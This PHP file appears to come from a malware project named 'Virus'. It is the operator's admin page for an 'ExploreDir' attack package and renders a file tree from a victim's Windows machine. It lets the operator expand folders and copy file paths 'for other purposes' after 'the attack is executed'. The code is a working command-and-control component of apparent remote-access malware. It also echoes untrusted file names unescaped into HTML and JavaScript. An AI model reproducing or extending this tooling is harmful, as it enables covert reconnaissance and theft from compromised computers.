<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir;
use Kelvinho\Virus\Singleton\Logs;
use function Kelvinho\Virus\map;

function niceSize(int $bytes): string {
    $labels = ["TB", "GB", "MB", "KB", "bytes"];
    $amounts = [1000000000000, 1000000000, 1000000, 1000, 1];
    $index = 0;
    if ($bytes == 0) {
        return "0 bytes";
    }
    while (true) {
        if ($bytes >= $amounts[$index]) {
            return ($bytes / $amounts[$index]) . " " . $labels[$index];
        }
        $index += 1;
    }
    Logs::unreachableState("ExploreDir admin page, niceSize");
    return "";
}

/*
How this stuff below even work? I'm too lazy to explain, but this flow should give you a rough understanding:

so,
0f0
0f1
0d2
	1f3
	1f4
	1f5
	1d6
		2f7
		2f8
		2d9
		2d10
			3f11
	1d12
	1d13
0d14
	1f15
process 0f0, reads, echos, return "", or successful, and there are still elements left
process 0f1, reads, echos, return "", or successful, and there are still elements left
process 0d2, given depth 0 by hand, no prev, reads, echos. Loops
	process 1f3, reads, echos, return ""
	process 1f4, reads, echos, return ""
	process 1f5, reads, echos, return ""
	process 1d6, given depth 1 by 0d2, no prev, reads, echos. Loops:
		process 2f7, echos, return ""
		process 2f8, echos, return ""
		process 2d9, given depth 2 by 1d6, no prev, reads, echos. Loops:
			process 2d10, given depth 3 by 2d9, no prev, reads. Sees new depth lower than given, does not process, return "unprocessed 2d10" and does not echo
			sees unprocessed line, break, look into unprocessed line, depth (2) equal given depth (2), return the same unprocessed line of 2d10
		sees unprocessed line 2d10, break, look into unprocessed line 2d10, see depth (2) larger than given depth (1), process the unprocessed line 2d10, given depth 2 by 1d6, prev, echos. Loops:
			process 3f11, echos, return ""
			process 1d12, given depth 3 by 2d10, no prev, reads. Sees new depth (1) lower than given (3), does not process, return "unprocessed 1d12" and does not echo
			sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) smaller than given depth (2), return "unprocessed 1d12" and does not echo
		sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) equal given depth (1), return "unprocessed 1d12" and does not echo
	sees unprocessed line 1d12, break, look into unprocessed line, see depth (1) larger than given depth (0), process the unprocessed line 1d12, given depth 1 by 0d2, prev, echos. Loops:
		process 1d13, given depth 2 by 1d12, no prev, reads. Sees new depth (1) lower than given depth (2), does not process, return "unprocessed 1d13" and does not echo

*/

function processLine($handle, int $givenDepth, array &$path, string $unprocessedLine = null): ?string {
    if ($unprocessedLine != null) {
        if (empty(trim($unprocessedLine))) {
            Logs::unreachableState("ExploreDir package, admin screen");
        }
        $lineDepth = (int)explode(";", $unprocessedLine)[0];
        if ($lineDepth < $givenDepth) {
            return $unprocessedLine;
        }
        $line = $unprocessedLine;
    } else {
        $line = fgets($handle);
        if ($line === false) {
            return null;
        }
        if (empty(trim($line))) {
            return null;
        }
    }
    $contents = map(explode(";", $line), function ($element) {
        return trim($element);
    });
    switch ($contents[1]) {
        case "f": ?>
            <li>
                <pre onclick="copyToClipboard('<?php echo join("\\\\", $path) . "\\\\" . $contents[4]; ?>')"><?php echo $contents[4]; ?>, size: <?php echo niceSize((int)$contents[2]); ?>, last updated: <?php echo $contents[3]; ?></pre>
            </li>
            <?php return "";
        case "d":
            $lineDepth = (int)$contents[0];
            if ($lineDepth < $givenDepth) {
                return $line;
            }
            $hash = "id_" . hash("sha256", rand()); ?>
            <li>
                <pre onclick="toggle('<?php echo $hash; ?>')"
                     style="cursor: pointer;"><b><?php echo trim($contents[4]); ?>, last updated: <?php echo $contents[3]; ?></b></pre>
                <ul id="<?php echo $hash; ?>" style="list-style-type: none;" class="folding">
                    <?php
                    $unprocessedLine = null;
                    array_push($path, trim($contents[4]));
                    while (true) {
                        $unprocessedLine = processLine($handle, $givenDepth + 1, $path, $unprocessedLine);
                        if ($unprocessedLine === null) {
                            break;
                        }
                        if ($unprocessedLine !== "") {
                            $contents = explode(";", $unprocessedLine);
                            if (((int)$contents[0]) <= $givenDepth) { // return unprocessed line
                                break;
                            }
                        }
                    }
                    array_pop($path);
                    ?>
                </ul>
            </li>
            <?php
            if ($unprocessedLine != null) {
                return $unprocessedLine;
            }
            return "";
        default:
            Logs::unreachableState("ExploreDir package, admin screen, f|d");
            return null;
    }
}


?>
<p>This attack is executed. Bold lines are the directories. You can click on them to either expand or
    collapse a directory. Click <a onclick="collapseAll()" style="color: blue; cursor: pointer">here</a> to
    collapse all. You can also click on files to copy their address for other purposes.</p>
<p>Please note that this might not be all of the files available. The maximum number of files and folders
    scanned are <?php echo ExploreDir::$maxLines ?>. Also if nothing is displayed below, it could be that
    the folder really does not have anything in it, or you have entered a nonexistent directory.</p>
<p>This is the file tree of <?php echo $attack->getRootDir(); ?></p>
<?php
$handle = fopen(DATA_FILE . "/attacks/" . $attack->getAttackId() . "/dirs.txt", "r");
if ($handle === false) {
    ?>(Can't read internal file)<?php
}
fgets($handle); // skips first line, cuz it's supposed to be empty
?>
<ul style="list-style-type: none;overflow: auto;">
    <?php
    $unprocessedLine = null;
    $path = [str_replace("\\", "\\\\", $attack->getRootDir())];
    while (true) {
        $unprocessedLine = processLine($handle, 0, $path, $unprocessedLine);
        if ($unprocessedLine === null) {
            break;
        }
    }
    ?>
</ul>